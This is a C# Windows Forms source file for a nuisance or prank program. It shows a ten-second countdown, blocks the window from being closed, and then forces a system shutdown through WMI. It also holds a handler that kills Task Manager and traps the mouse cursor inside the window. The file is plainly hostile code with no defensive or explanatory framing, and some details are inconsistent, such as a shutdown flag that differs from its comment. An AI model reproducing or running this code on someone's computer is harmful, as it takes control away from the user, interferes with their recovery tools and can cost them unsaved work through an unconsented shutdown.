using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Management;


// Author: Elliot Levin
// date:26/10/09
//version: 3.0

namespace WindowsApplication1
{
    public partial class Form1 : Form
    {
        protected int i = 10;
        public Form1()
        {
            InitializeComponent();

        }

        private void Form1_Load_1(object sender, EventArgs e)
        {
            Refresh();
            this.ControlBox = false;
            Refresh();

            timer1.Enabled = true;
            timer1.Interval = 1000;
            timer1.Start();

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            label6.Text = i.ToString();
            label6.Refresh();
            i--;
            if (i <= 10)
            {
                label6.Text = "00:0" + i.ToString();
            }
            if (i == -1)
            {
                timer1.Stop();
                shutdown_sequence();
            }
        }
        private void timer2_Tick(object sender, EventArgs e)
        {
            this.Cursor = new Cursor(Cursor.Current.Handle);
            Cursor.Position = new Point(Cursor.Position.X - 200, Cursor.Position.Y - 200);
            Cursor.Clip = new Rectangle(this.Location, this.Size);
            try
            {
                System.Diagnostics.Process.GetProcessesByName("taskmgr")[0].Kill();
            }
            catch
            {
            }
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            base.OnClosing(e);
        }



        /*
         **************************************************************************************** 
         * **************************************************************************************** 
         */



        void shutdown_sequence()
        {
            ManagementBaseObject outParameters = null;
            ManagementClass sysOS = new ManagementClass("Win32_OperatingSystem");
            sysOS.Get();
            // enables required security privilege.
            sysOS.Scope.Options.EnablePrivileges = true;
            // get our in parameters
            ManagementBaseObject inParameters = sysOS.GetMethodParameters("Win32Shutdown");
            // pass the flag of 0 = System Shutdown
            inParameters["Flags"] = "1";
            inParameters["Reserved"] = "0";
            foreach (ManagementObject manObj in sysOS.GetInstances())
            {
                outParameters = manObj.InvokeMethod("Win32Shutdown", inParameters, null);
            }
            Close();
        }
    }
}
